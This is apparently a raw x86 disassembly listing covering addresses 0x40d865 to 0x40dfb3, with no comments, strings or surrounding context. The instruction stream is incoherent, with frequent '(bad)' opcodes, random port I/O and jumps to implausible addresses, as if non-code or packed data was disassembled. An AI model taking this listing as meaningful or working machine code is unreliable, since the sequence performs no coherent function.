  40d865:	sub    al,0xd0
  40d867:	inc    eax
  40d868:	stc    
  40d869:	cld    
  40d86a:	sbb    eax,0x5412d18
  40d86f:	jmp    0xcd86210c
  40d874:	adc    al,0x2c
  40d876:	jecxz  0x40d84b
  40d878:	sub    BYTE PTR [ecx+0x5b],cl
  40d87b:	into   
  40d87c:	and    cl,BYTE PTR gs:[ecx+0x3e305189]
  40d883:	or     eax,edi
  40d885:	test   DWORD PTR [edx+ebp*8+0x6f54bd79],edx
  40d88c:	pop    es
  40d88d:	and    esp,DWORD PTR [esp+0x32]
  40d891:	ret    
  40d892:	adc    ah,dl
  40d894:	scas   eax,DWORD PTR es:[edi]
  40d895:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d896:	out    dx,eax
  40d897:	xchg   ebp,eax
  40d898:	mov    eax,0xf810084c
  40d89d:	and    ah,cl
  40d89f:	mov    bh,0xc8
  40d8a1:	stos   DWORD PTR es:[edi],eax
  40d8a2:	lods   al,BYTE PTR ds:[esi]
  40d8a3:	rcr    BYTE PTR [esi+0x28917f6f],cl
  40d8a9:	ficom  WORD PTR [ebx]
  40d8ab:	jmp    0x40d91c
  40d8ad:	xchg   esi,eax
  40d8ae:	sar    ebp,cl
  40d8b0:	shl    DWORD PTR [ebx+0x25d32094],cl
  40d8b6:	rcl    DWORD PTR [edx+0x7f25244],0x4
  40d8bd:	and    eax,0x9c53af41
  40d8c2:	stos   BYTE PTR es:[edi],al
  40d8c3:	cmp    eax,0x63733e3f
  40d8c8:	cmp    cl,ah
  40d8ca:	iret   
  40d8cb:	mov    esi,0xf686800a
  40d8d0:	out    0xa3,al
  40d8d2:	mov    ecx,0xee1316c6
  40d8d7:	jmp    0x40d912
  40d8d9:	inc    esp
  40d8da:	pushf  
  40d8db:	dec    edx
  40d8dc:	je     0x40d871
  40d8de:	adc    DWORD PTR [esi],0x2e00a8c8
  40d8e4:	dec    esp
  40d8e5:	jb     0x40d922
  40d8e7:	in     al,0x5a
  40d8e9:	mov    BYTE PTR [eax],al
  40d8eb:	jbe    0x40d913
  40d8ed:	out    dx,al
  40d8ee:	cld    
  40d8ef:	jno    0x40d8ea
  40d8f1:	in     eax,dx
  40d8f2:	data16 lahf 
  40d8f4:	icebp  
  40d8f5:	jno    0x40d902
  40d8f7:	add    eax,0xd29e1069
  40d8fc:	dec    ebp
  40d8fd:	pop    ds
  40d8fe:	jg     0x40d8f4
  40d900:	push   ecx
  40d901:	xchg   esi,eax
  40d902:	imul   bh
  40d904:	out    0x7,eax
  40d906:	jle    0x40d8e8
  40d908:	pop    es
  40d909:	dec    ecx
  40d90a:	xchg   edx,eax
  40d90b:	cwde   
  40d90c:	jle    0x40d8bd
  40d90e:	(bad)  
  40d90f:	jmp    0xf1b18847
  40d914:	loop   0x40d95b
  40d916:	(bad)  
  40d917:	(bad)  
  40d918:	pop    edx
  40d919:	pop    esp
  40d91a:	pop    esi
  40d91b:	imul   esi,DWORD PTR [ebx-0x1a345184],0xcdf5922b
  40d925:	test   ch,dh
  40d927:	dec    ebp
  40d928:	dec    ecx
  40d929:	scas   eax,DWORD PTR es:[edi]
  40d92a:	push   edi
  40d92b:	add    dh,BYTE PTR [ecx]
  40d92d:	push   es
  40d92e:	mov    dl,0x81
  40d930:	xchg   esp,eax
  40d931:	arpl   WORD PTR [edx-0x30],bp
  40d934:	adc    ebp,DWORD PTR [ebx]
  40d936:	leave  
  40d937:	and    al,0xe2
  40d939:	push   esp
  40d93a:	xor    ah,dh
  40d93c:	sub    esi,edx
  40d93e:	pop    esi
  40d93f:	retf   
  40d940:	retf   0xf5f8
  40d943:	xor    al,0x73
  40d945:	mov    edi,0xea3a5454
  40d94a:	sbb    dh,0x66
  40d94d:	cli    
  40d94e:	xchg   ecx,eax
  40d94f:	push   es
  40d950:	addr16 das 
  40d952:	jp     0x40d950
  40d954:	in     al,0xff
  40d956:	cmc    
  40d957:	sbb    al,0x9f
  40d959:	sti    
  40d95a:	ret    0xde71
  40d95d:	repz mov fs,WORD PTR [ebx]
  40d960:	sbb    al,0xb9
  40d962:	jnp    0x40d993
  40d964:	xchg   ebp,eax
  40d965:	retf   0x6b18
  40d968:	jmp    0x40d9a7
  40d96a:	sahf   
  40d96b:	jns    0x40d95b
  40d96d:	and    eax,0x1dbfe8fe
  40d972:	in     eax,0x89
  40d974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d975:	aaa    
  40d976:	or     BYTE PTR [ebx+0x1bf92d69],dl
  40d97c:	mov    ds,WORD PTR [edx-0x1f]
  40d97f:	inc    edx
  40d980:	arpl   WORD PTR [edi-0x37f3ce10],ax
  40d986:	rcr    edx,cl
  40d988:	push   ebx
  40d989:	jmp    0xd570:0x5a75884d
  40d990:	pushf  
  40d991:	and    al,0xa0
  40d993:	out    0x5b,al
  40d995:	sbb    ebp,DWORD PTR [eax-0x226aef9c]
  40d99b:	outs   dx,DWORD PTR ds:[esi]
  40d99c:	ins    BYTE PTR es:[edi],dx
  40d99d:	add    ecx,esi
  40d99f:	test   ebp,0xc7b0f8b8
  40d9a5:	(bad)  
  40d9a7:	and    DWORD PTR [edx],esp
  40d9a9:	retf   0x6e48
  40d9ac:	cmc    
  40d9ad:	jecxz  0x40d9d0
  40d9af:	ins    BYTE PTR es:[edi],dx
  40d9b0:	retf   0x74ee
  40d9b3:	mov    ebx,0xd655c1d0
  40d9b8:	cmc    
  40d9b9:	call   0xdfb16db2
  40d9be:	adc    ebp,eax
  40d9c0:	ror    BYTE PTR [esp+ebx*1+0x42],0x1c
  40d9c5:	dec    ebx
  40d9c6:	mov    ds:0x52666630,al
  40d9cb:	loopne 0x40d9d6
  40d9cd:	adc    eax,0x433ea05b
  40d9d2:	push   esi
  40d9d3:	push   eax
  40d9d4:	cdq    
  40d9d5:	cli    
  40d9d6:	mov    ?,WORD PTR [ebx]
  40d9d8:	in     al,0x1
  40d9da:	fsub   st,st(0)
  40d9dc:	iret   
  40d9dd:	xor    al,BYTE PTR [ebx]
  40d9df:	jo     0x40d97c
  40d9e1:	sub    cl,BYTE PTR [edi]
  40d9e3:	retw   0xd381
  40d9e7:	mov    ?,WORD PTR [edi-0x1d]
  40d9ea:	add    al,al
  40d9ec:	mov    al,ds:0xc3809485
  40d9f1:	xor    ah,al
  40d9f3:	idiv   ebp
  40d9f5:	imul   edi,DWORD PTR [edx+0x0],0xffffffcc
  40d9f9:	mul    BYTE PTR [edx]
  40d9fb:	js     0x40da5c
  40d9fd:	les    edx,FWORD PTR [eax]
  40d9ff:	jbe    0x40d9d4
  40da01:	lods   al,BYTE PTR ds:[esi]
  40da02:	int    0x41
  40da04:	or     dl,bh
  40da06:	mov    ebp,0xe8941a9e
  40da0b:	shl    BYTE PTR [eax-0x58],cl
  40da0e:	enter  0xcbc0,0x17
  40da12:	das    
  40da13:	jb     0x40da0e
  40da15:	loop   0x40da5c
  40da17:	cmp    al,0xdf
  40da19:	(bad)  
  40da1a:	idiv   DWORD PTR [edx+ebp*4]
  40da1d:	mov    ch,0x1a
  40da1f:	jae    0x40da14
  40da21:	repz mov esp,0x3443c1e1
  40da27:	call   0xb2e5:0x2af56a0d
  40da2e:	(bad)  
  40da2f:	and    BYTE PTR [ecx+0x6b],ah
  40da32:	mov    ebx,0xbecfb3cd
  40da37:	ror    cl,0x93
  40da3a:	retf   
  40da3b:	sub    al,0x2f
  40da3d:	lahf   
  40da3e:	out    0xe5,eax
  40da40:	adc    edx,DWORD PTR [edi+0x39]
  40da43:	jnp    0x40d9e6
  40da45:	les    edx,FWORD PTR [esi-0x55]
  40da48:	inc    esi
  40da49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da4a:	aas    
  40da4b:	mov    DWORD PTR [ebx+esi*8-0x6d77d2f6],edx
  40da52:	xchg   ebx,eax
  40da53:	hlt    
  40da54:	and    al,BYTE PTR [esi]
  40da56:	sbb    DWORD PTR [ecx],edi
  40da58:	jg     0x40dab4
  40da5a:	bound  esp,QWORD PTR [edi-0x10ac86b1]
  40da60:	ss shr ah,cl
  40da63:	sub    BYTE PTR [esi-0x52],dh
  40da66:	addr16 aad 0x1
  40da69:	ret    
  40da6a:	add    al,0xb4
  40da6c:	das    
  40da6d:	dec    esi
  40da6e:	aam    0xe9
  40da70:	or     eax,0x727d1e03
  40da75:	fwait
  40da76:	addr16 (bad) 
  40da78:	ds ret 
  40da7a:	js     0x40da6f
  40da7c:	dec    ecx
  40da7d:	push   0x35
  40da7f:	(bad)  
  40da80:	pop    esi
  40da81:	outs   dx,DWORD PTR ds:[esi]
  40da82:	enter  0x76e6,0x48
  40da86:	jg     0x40dad8
  40da88:	push   es
  40da89:	xor    DWORD PTR [edi-0x1d976368],esp
  40da8f:	sbb    dl,BYTE PTR [ecx+esi*1]
  40da92:	inc    esp
  40da93:	in     al,0x64
  40da95:	sub    BYTE PTR [edx-0xd5eff98],dh
  40da9b:	dec    BYTE PTR [ecx-0x7f]
  40da9e:	dec    esp
  40da9f:	add    al,0x49
  40daa1:	sub    al,0x90
  40daa3:	xor    esp,eax
  40daa5:	mov    DWORD PTR [edx+0x6860181d],ebx
  40daab:	int3   
  40daac:	xor    eax,0x99f679c6
  40dab1:	test   DWORD PTR [ecx],esp
  40dab3:	inc    edx
  40dab4:	addr16 lahf 
  40dab6:	shl    ecx,1
  40dab8:	aad    0x3e
  40daba:	xchg   ecx,eax
  40dabb:	(bad)  
  40dabd:	mov    ds:0xbf0b02d1,al
  40dac2:	test   edx,edi
  40dac4:	test   BYTE PTR [ebx+edi*8+0x7c],0x76
  40dac9:	adc    esp,DWORD PTR [eax+0x63]
  40dacc:	adc    ah,dl
  40dace:	(bad)  
  40dacf:	xchg   esp,eax
  40dad0:	mov    bh,0x15
  40dad2:	mov    WORD PTR [edi],?
  40dad4:	mov    DWORD PTR [ebx],edi
  40dad6:	sbb    edx,DWORD PTR [eax+0x32]
  40dad9:	sbb    al,0xf4
  40dadb:	mov    ecx,0xaa31aee7
  40dae0:	adc    eax,0x5464cd9f
  40dae5:	and    eax,0x1b374505
  40daea:	sbb    ebx,DWORD PTR [ebx]
  40daec:	xchg   esi,eax
  40daed:	push   cs
  40daee:	jb     0x40dadd
  40daf0:	adc    eax,0xdbc04d54
  40daf5:	fisubr DWORD PTR [esi+0x32]
  40daf8:	and    edx,DWORD PTR [eax-0x47b4eccd]
  40dafe:	(bad)  
  40daff:	or     al,0xe5
  40db01:	shl    BYTE PTR [ecx+0x47172742],cl
  40db07:	in     eax,dx
  40db08:	dec    edx
  40db09:	cld    
  40db0a:	popf   
  40db0b:	and    al,0x3c
  40db0d:	push   0x5cedee98
  40db12:	push   esp
  40db13:	sar    ebp,0xdb
  40db16:	add    DWORD PTR [esi+0x15],ecx
  40db19:	dec    edx
  40db1a:	jge    0x40dad7
  40db1c:	dec    ebp
  40db1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db1e:	push   ecx
  40db1f:	sbb    BYTE PTR [esi+0x36],0x25
  40db23:	mov    bl,0xd5
  40db25:	jge    0x40daba
  40db27:	cmp    BYTE PTR [esi],ah
  40db29:	shl    DWORD PTR [ecx+0x1b1b9b02],1
  40db2f:	retf   0xeb82
  40db32:	sti    
  40db33:	xchg   esp,eax
  40db34:	stos   DWORD PTR es:[edi],eax
  40db35:	push   ebp
  40db36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db39:	imul   esi,DWORD PTR [esi],0x4d4e4c9b
  40db3f:	icebp  
  40db40:	sub    eax,0xef30f2df
  40db45:	std    
  40db46:	mov    dh,0xf7
  40db48:	adc    al,BYTE PTR [esi+0x21]
  40db4b:	popf   
  40db4c:	dec    esi
  40db4d:	mov    edx,DWORD PTR [ebx-0x59]
  40db50:	pop    esi
  40db51:	data16 stc 
  40db53:	int3   
  40db54:	pop    ecx
  40db55:	dec    esi
  40db56:	sahf   
  40db57:	cmp    cl,bh
  40db59:	ror    edi,cl
  40db5b:	ds (bad) 
  40db5d:	repnz (bad) [eax-0xa7aa953]
  40db64:	in     eax,dx
  40db65:	or     edx,esp
  40db67:	push   0x20e3782f
  40db6c:	jmp    0x40db98
  40db6e:	add    bh,0x4f
  40db71:	mov    al,0x4c
  40db73:	and    DWORD PTR [ecx],ebx
  40db75:	add    BYTE PTR [ecx],dl
  40db77:	and    al,0x11
  40db79:	push   ss
  40db7a:	sub    eax,0xa6f5cc38
  40db7f:	call   0x9a21:0x1779c385
  40db86:	or     DWORD PTR [eax],edi
  40db88:	rcr    BYTE PTR [edx+0x54],cl
  40db8b:	nop
  40db8c:	jb     0x40db28
  40db8e:	out    dx,al
  40db8f:	mov    al,ds:0x53dfb749
  40db94:	iret   
  40db95:	inc    edx
  40db96:	or     al,0x22
  40db98:	add    BYTE PTR [edi-0x560bf57c],bh
  40db9e:	xchg   ebx,eax
  40db9f:	sbb    eax,0xe8098632
  40dba4:	gs retf 
  40dba6:	add    al,0xcc
  40dba8:	(bad)  
  40dba9:	int3   
  40dbaa:	jnp    0x40dc24
  40dbac:	push   esi
  40dbad:	add    eax,0x8c811248
  40dbb2:	and    eax,0x85884889
  40dbb7:	xchg   edi,ebp
  40dbb9:	push   0x2a
  40dbbb:	add    ah,bh
  40dbbd:	cdq    
  40dbbe:	test   BYTE PTR [ebp+0x4f5cc2d0],dl
  40dbc4:	fistp  DWORD PTR [ebx-0x50]
  40dbc7:	test   al,0x20
  40dbc9:	mov    ebp,0xcf21a8d7
  40dbce:	and    BYTE PTR [edx],cl
  40dbd0:	enter  0xc86,0x67
  40dbd4:	(bad)  
  40dbd5:	mov    edx,DWORD PTR [eax]
  40dbd7:	ret    0xf171
  40dbda:	inc    ebp
  40dbdb:	neg    BYTE PTR [edx]
  40dbdd:	or     cl,BYTE PTR [eax+0x4e096de4]
  40dbe3:	xlat   BYTE PTR ds:[ebx]
  40dbe4:	mov    ds:0x8e915d6c,al
  40dbe9:	add    cl,BYTE PTR [edx+edx*4-0x78]
  40dbed:	test   eax,0x8c664a89
  40dbf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbf3:	lahf   
  40dbf4:	and    DWORD PTR [ebx+0x37076c0a],ebx
  40dbfa:	loopne 0x40dbc1
  40dbfc:	(bad)  
  40dbfd:	jg     0x40dbfb
  40dbff:	jecxz  0x40dbb8
  40dc01:	rol    BYTE PTR [edx+0x54],cl
  40dc04:	fsubr  DWORD PTR [esi+0x32]
  40dc07:	pop    ds
  40dc08:	and    bl,0x53
  40dc0b:	iret   
  40dc0c:	sbb    BYTE PTR [ebx],dh
  40dc0e:	mov    dl,0x1f
  40dc10:	ret    0x1c35
  40dc13:	call   0x495c:0xfdbbcf97
  40dc1a:	lahf   
  40dc1b:	dec    edi
  40dc1c:	and    bl,BYTE PTR [edx-0xc]
  40dc1f:	or     al,0x79
  40dc21:	retf   
  40dc22:	stos   BYTE PTR es:[edi],al
  40dc23:	stos   DWORD PTR es:[edi],eax
  40dc24:	dec    edx
  40dc25:	mov    eax,0xfe5be5c7
  40dc2a:	xor    esp,0xffffffba
  40dc2d:	pop    ebp
  40dc2e:	pop    ebp
  40dc2f:	jne    0x40dc97
  40dc31:	je     0x40dc92
  40dc33:	pop    esi
  40dc34:	in     eax,0xb0
  40dc36:	(bad)  
  40dc37:	fsub   QWORD PTR [ecx+eiz*2]
  40dc3a:	shr    bh,1
  40dc3c:	jae    0x40dc2f
  40dc3e:	cld    
  40dc3f:	jns    0x40dc96
  40dc41:	(bad)
  40dc45:	xchg   ebp,eax
  40dc46:	dec    edx
  40dc47:	aam    0xea
  40dc49:	jne    0x40dc11
  40dc4b:	daa    
  40dc4c:	daa    
  40dc4d:	cdq    
  40dc4e:	sahf   
  40dc4f:	sahf   
  40dc50:	data16 (bad) 
  40dc52:	(bad)  
  40dc53:	mov    ebx,0xdffbe6f9
  40dc58:	and    bh,0x9
  40dc5b:	cmp    bl,ch
  40dc5d:	imul   ebp,DWORD PTR ss:[ebx-0x69],0xffffffb9
  40dc62:	js     0x40dc45
  40dc64:	add    ch,BYTE PTR [edi]
  40dc66:	mov    edi,0xcf33ccb2
  40dc6b:	sahf   
  40dc6c:	in     al,0xe4
  40dc6e:	jmp    0x662c47a9
  40dc73:	ss mov dh,0xa7
  40dc76:	fldcw  WORD PTR [edi+ecx*2+0x20]
  40dc7a:	pop    es
  40dc7b:	gs nop
  40dc7d:	adc    eax,0xabc03528
  40dc82:	sub    BYTE PTR [edi],0x40
  40dc85:	or     al,0x41
  40dc87:	xchg   BYTE PTR [eax-0x58],al
  40dc8a:	sbb    BYTE PTR [ebx+0x755498c],al
  40dc90:	lods   eax,DWORD PTR ds:[esi]
  40dc91:	retf   
  40dc92:	out    dx,eax
  40dc93:	xchg   BYTE PTR [ecx],bh
  40dc95:	pop    eax
  40dc96:	out    dx,eax
  40dc97:	xor    BYTE PTR [ebx-0x76],0x9d
  40dc9b:	inc    ebp
  40dc9c:	test   al,0xf5
  40dc9e:	ins    DWORD PTR es:[edi],dx
  40dc9f:	test   BYTE PTR [edx+0x2a],al
  40dca2:	add    al,0x28
  40dca4:	xlat   BYTE PTR ds:[ebx]
  40dca5:	sahf   
  40dca6:	imul   edx,eax,0xb
  40dca9:	aam    0x1f
  40dcab:	mov    cs,WORD PTR [edx]
  40dcad:	popa   
  40dcae:	outs   dx,DWORD PTR ds:[esi]
  40dcaf:	popf   
  40dcb0:	ret    0xa47c
  40dcb3:	mov    dh,0x1
  40dcb5:	in     al,0x1e
  40dcb7:	leave  
  40dcb8:	adc    bh,BYTE PTR [edi+0x4812344c]
  40dcbe:	dec    eax
  40dcbf:	jl     0x40dc42
  40dcc1:	mov    ch,dl
  40dcc3:	xor    edi,DWORD PTR [eax+0x76]
  40dcc6:	test   DWORD PTR cs:[ecx-0x57e729a2],edi
  40dccd:	inc    edi
  40dcce:	or     BYTE PTR [esi],ch
  40dcd0:	mov    bl,0xb1
  40dcd2:	scas   al,BYTE PTR es:[edi]
  40dcd3:	ret    
  40dcd4:	dec    esp
  40dcd5:	add    al,0x66
  40dcd7:	cs mov dh,0x5f
  40dcda:	mov    edx,0x9ae7406e
  40dcdf:	cdq    
  40dce0:	outs   dx,BYTE PTR ds:[esi]
  40dce1:	retf   
  40dce2:	mov    ds,WORD PTR [ebx]
  40dce4:	xor    DWORD PTR [eax-0x6],0x62e32776
  40dceb:	sbb    bh,BYTE PTR [ebp+0x2303a669]
  40dcf1:	pop    es
  40dcf2:	aam    0xaa
  40dcf4:	push   ds
  40dcf5:	ret    
  40dcf6:	popa   
  40dcf7:	pop    eax
  40dcf8:	cmp    BYTE PTR [esi-0xd],cl
  40dcfb:	jae    0x40dd59
  40dcfd:	or     bl,dl
  40dcff:	ins    DWORD PTR es:[edi],dx
  40dd00:	lsl    eax,WORD PTR [esi-0x56ffbb65]
  40dd07:	mov    ebx,0x47310b2f
  40dd0c:	ins    DWORD PTR es:[edi],dx
  40dd0d:	add    BYTE PTR [esi-0x3e],ch
  40dd10:	nop
  40dd11:	lods   al,BYTE PTR ds:[esi]
  40dd12:	push   ds
  40dd13:	call   0x5213df4a
  40dd18:	jns    0x40dcef
  40dd1a:	and    BYTE PTR [edi],ch
  40dd1c:	in     eax,0x8b
  40dd1e:	mov    WORD PTR [edi+0x46],?
  40dd21:	lahf   
  40dd22:	retf   0xf470
  40dd25:	pushf  
  40dd26:	ficom  DWORD PTR [eax-0x14af0181]
  40dd2c:	popa   
  40dd2d:	imul   esp,DWORD PTR [ecx],0x797e1b93
  40dd33:	in     eax,dx
  40dd34:	jmp    0x1125e62f
  40dd39:	aas    
  40dd3a:	push   es
  40dd3b:	andnps xmm4,xmm3
  40dd3e:	jge    0x40ddb3
  40dd40:	jae    0x40dcd5
  40dd42:	jae    0x40dceb
  40dd44:	dec    edi
  40dd45:	repz inc edx
  40dd47:	mov    ecx,0xa254a94c
  40dd4c:	push   edx
  40dd4d:	lods   eax,DWORD PTR ds:[esi]
  40dd4e:	xor    bh,BYTE PTR [esi]
  40dd50:	ds dec esi
  40dd52:	lods   eax,DWORD PTR ds:[esi]
  40dd53:	pop    esi
  40dd54:	addr16 jb 0x40ddc9
  40dd57:	xor    DWORD PTR [edi-0x42],0x7bef30e3
  40dd5e:	(bad)  
  40dd60:	lock cmp eax,0x65d870c9
  40dd66:	jne    0x40dd15
  40dd68:	(bad)
  40dd6b:	sub    eax,0x9cfa3636
  40dd70:	ds mov ebx,0xbccfd3c9
  40dd76:	ret    0xbb9
  40dd79:	pop    ebx
  40dd7a:	ins    BYTE PTR es:[edi],dx
  40dd7b:	mov    bh,0x7c
  40dd7d:	scas   al,BYTE PTR es:[edi]
  40dd7e:	outs   dx,BYTE PTR ds:[esi]
  40dd7f:	dec    esp
  40dd80:	and    bl,al
  40dd82:	sbb    eax,esi
  40dd84:	sbb    esp,DWORD PTR [eax]
  40dd86:	es and al,dh
  40dd89:	ror    DWORD PTR [ebx+0x208fac35],0xd1
  40dd90:	or     al,0x22
  40dd92:	sbb    DWORD PTR [edx],ebp
  40dd94:	mov    ds:0x22ffb133,al
  40dd99:	sti    
  40dd9a:	cmp    eax,0x4dc92d32
  40dd9f:	pop    ss
  40dda0:	ss dec esp
  40dda2:	shr    dl,0xed
  40dda5:	scas   al,BYTE PTR es:[edi]
  40dda6:	mov    ah,0xb
  40dda8:	mov    dl,0xb0
  40ddaa:	xlat   BYTE PTR ds:[ebx]
  40ddab:	xor    cl,BYTE PTR [esi-0xb4342dc]
  40ddb1:	sub    al,0x4d
  40ddb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddb4:	fiadd  WORD PTR ds:0x84568157
  40ddba:	and    BYTE PTR fs:[esi-0x5656648e],bh
  40ddc1:	mov    bl,0x71
  40ddc3:	adc    ah,bl
  40ddc5:	lds    ebp,FWORD PTR [eax]
  40ddc7:	add    dh,ch
  40ddc9:	dec    ebp
  40ddca:	adc    DWORD PTR ds:0xee9db78b,0xadb5e996
  40ddd4:	jge    0x40dd96
  40ddd6:	fcomp  QWORD PTR [edi-0x71]
  40ddd9:	adc    eax,0xb420c452
  40ddde:	stc    
  40dddf:	xor    eax,0x82a7afaf
  40dde4:	dec    ecx
  40dde5:	ja     0x40dd6c
  40dde7:	mov    ecx,0x7333ed9e
  40ddec:	cwde   
  40dded:	xor    al,0x47
  40ddef:	addr16 lahf 
  40ddf1:	lds    ebp,FWORD PTR [edx+edi*1+0x53359aaa]
  40ddf8:	and    al,0x10
  40ddfa:	inc    esi
  40ddfb:	push   eax
  40ddfc:	scas   eax,DWORD PTR es:[edi]
  40ddfd:	dec    ecx
  40ddfe:	out    dx,al
  40ddff:	cmp    dl,ah
  40de01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de02:	fild   QWORD PTR [edi]
  40de04:	scas   al,BYTE PTR es:[edi]
  40de05:	add    eax,0x35f7c660
  40de0a:	bound  eax,QWORD PTR [eax]
  40de0c:	dec    esi
  40de0d:	mov    ds,WORD PTR [esp+esi*2-0x19b225e5]
  40de14:	add    al,0x34
  40de16:	mov    edx,0x2af981bd
  40de1b:	inc    ebp
  40de1c:	xchg   ebp,eax
  40de1d:	mov    dl,0x1
  40de1f:	mov    BYTE PTR ds:0x613949ce,bl
  40de25:	push   ds
  40de26:	and    bl,BYTE PTR [ecx-0xd0f451a]
  40de2c:	inc    esp
  40de2d:	popf   
  40de2e:	xlat   BYTE PTR ds:[ebx]
  40de2f:	test   eax,0xc8aab0f2
  40de34:	push   eax
  40de35:	push   0x431188d4
  40de3a:	int3   
  40de3b:	pusha  
  40de3c:	loopne 0x40de86
  40de3e:	xchg   BYTE PTR [ebx],bl
  40de40:	outs   dx,DWORD PTR ds:[esi]
  40de41:	add    cl,BYTE PTR [eax-0x2d0a671e]
  40de47:	adc    eax,0xc42207ca
  40de4c:	xor    BYTE PTR [eax],ah
  40de4e:	mov    ecx,0x1a954d3a
  40de53:	sahf   
  40de54:	outs   dx,DWORD PTR ds:[esi]
  40de55:	(bad)  
  40de56:	xlat   BYTE PTR ds:[ebx]
  40de57:	adc    eax,DWORD PTR [esi-0x50b0fcc6]
  40de5d:	fisttp DWORD PTR [ebp-0x4d]
  40de60:	or     eax,0x9972a501
  40de65:	push   edx
  40de66:	adc    al,dl
  40de68:	sbb    al,0x1b
  40de6a:	arpl   WORD PTR [esi+0x76],sp
  40de6d:	xchg   esi,eax
  40de6e:	pop    es
  40de6f:	pop    esi
  40de70:	mov    bh,0x8f
  40de72:	icebp  
  40de73:	mov    DWORD PTR [ecx-0x16],esi
  40de76:	mov    ch,0xa
  40de78:	and    DWORD PTR [ecx-0x61],0x4e
  40de7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de7d:	lds    ebx,FWORD PTR [ecx-0x2c334cd]
  40de83:	hlt    
  40de84:	jno    0x40dee4
  40de86:	jl     0x40de79
  40de88:	add    ch,BYTE PTR [edi]
  40de8a:	popf   
  40de8b:	fsub   st,st(6)
  40de8d:	in     al,dx
  40de8e:	add    eax,0x126d5958
  40de93:	jbe    0x40de3b
  40de95:	rcr    DWORD PTR [edi+0x2fcc082],0x48
  40de9c:	dec    eax
  40de9d:	jp     0x40debf
  40de9f:	pop    es
  40dea0:	adc    BYTE PTR [edi],cl
  40dea2:	aam    0xb2
  40dea4:	push   ebp
  40dea5:	and    DWORD PTR [eax+ebx*8-0x55],ebx
  40dea9:	jg     0x40de36
  40deab:	and    al,BYTE PTR [esi]
  40dead:	lea    edx,[edi-0x40]
  40deb0:	xor    dl,BYTE PTR [ecx+0x30cf0754]
  40deb6:	adc    ebp,DWORD PTR [ecx+0x18e78791]
  40debc:	adc    eax,0x5f404c33
  40dec1:	or     esp,DWORD PTR [ecx-0x2322a44a]
  40dec7:	mov    al,ds:0x13df052c
  40decc:	cmp    eax,0x44f13fff
  40ded1:	push   0xffffffd0
  40ded3:	jae    0x40dee8
  40ded5:	js     0x40df3d
  40ded7:	adc    BYTE PTR [ebx+edi*2-0xe608b23],ah
  40dede:	sbb    ah,BYTE PTR [esp+ecx*1+0x80aa721]
  40dee5:	xchg   DWORD PTR [eax+0x592efba5],ecx
  40deeb:	out    0x20,al
  40deed:	xor    edx,edx
  40deef:	(bad)  
  40def1:	inc    edx
  40def2:	iret   
  40def3:	xor    ecx,eax
  40def5:	xor    DWORD PTR [ebx-0x5be7f66c],esp
  40defb:	mov    ds:0x289c5a18,al
  40df00:	pop    ss
  40df01:	loopne 0x40df57
  40df03:	push   ebx
  40df04:	mov    dl,0x6f
  40df06:	outs   dx,DWORD PTR ds:[esi]
  40df07:	xchg   ebx,eax
  40df08:	xor    dl,ch
  40df0a:	out    dx,al
  40df0b:	mov    BYTE PTR [eax],ch
  40df0d:	dec    ebp
  40df0e:	push   es
  40df0f:	stos   BYTE PTR es:[edi],al
  40df10:	cld    
  40df11:	std    
  40df12:	je     0x40df4f
  40df14:	ret    
  40df15:	stos   DWORD PTR es:[edi],eax
  40df16:	shr    BYTE PTR [esi-0x26],1
  40df19:	or     BYTE PTR [eax+0x5b36ffa6],bl
  40df1f:	pop    ebp
  40df20:	inc    edx
  40df21:	iret   
  40df22:	dec    edx
  40df23:	pop    edi
  40df24:	jecxz  0x40df35
  40df26:	ja     0x40deb1
  40df28:	mov    bh,0x8
  40df2a:	add    eax,0xef9b04b8
  40df2f:	les    edi,FWORD PTR [edx+edi*2-0x46738bb0]
  40df36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df37:	pop    ecx
  40df38:	into   
  40df39:	pop    ebx
  40df3a:	pop    ebx
  40df3b:	or     eax,0x68a3097a
  40df40:	neg    DWORD PTR [edx-0x4b]
  40df43:	xchg   esp,eax
  40df44:	or     BYTE PTR [edx+edi*1],bh
  40df47:	mov    dl,0x45
  40df49:	mov    eax,0xf7932aff
  40df4e:	push   esp
  40df4f:	or     bl,bl
  40df51:	xchg   edx,eax
  40df52:	mov    al,0x53
  40df54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df55:	fisubr DWORD PTR [esi+0x3928b1a5]
  40df5b:	in     al,0x11
  40df5d:	add    al,0x41
  40df5f:	pop    edx
  40df60:	add    DWORD PTR [edi+0x3f],eax
  40df63:	fcmovnbe st,st(6)
  40df65:	out    0x26,al
  40df67:	imul   ebp,DWORD PTR [ebx+0x6b],0xfffffff6
  40df6b:	jns    0x40df17
  40df6d:	fisubr DWORD PTR [esi-0x3ecec6d0]
  40df73:	rcl    dl,cl
  40df75:	pop    ebp
  40df76:	jl     0x40df6b
  40df78:	aaa    
  40df79:	mov    edi,0xa2884801
  40df7e:	add    DWORD PTR [ebx],ebp
  40df80:	xchg   edi,eax
  40df81:	das    
  40df82:	repnz aam 0xd3
  40df85:	(bad)  
  40df86:	pop    eax
  40df87:	pop    esi
  40df88:	mov    esi,0x9d2f8bcc
  40df8d:	out    0xb9,al
  40df8f:	pop    ss
  40df90:	sahf   
  40df91:	addr16 in eax,0x6a
  40df94:	test   DWORD PTR [ebp+0x7b2426ed],ebp
  40df9a:	rcr    BYTE PTR [ebx-0x1aa380fe],0xa2
  40dfa1:	sub    cl,BYTE PTR [ecx]
  40dfa3:	dec    ebp
  40dfa4:	cwde   
  40dfa5:	xchg   BYTE PTR [ecx],bl
  40dfa7:	je     0x40dfc6
  40dfa9:	xchg   esp,eax
  40dfaa:	pusha  
  40dfab:	bound  edx,QWORD PTR [edi]
  40dfad:	adc    ch,ch
  40dfaf:	pop    esi
  40dfb0:	shl    DWORD PTR [eax+0x5e],cl
  40dfb3:	call   0x47d262b
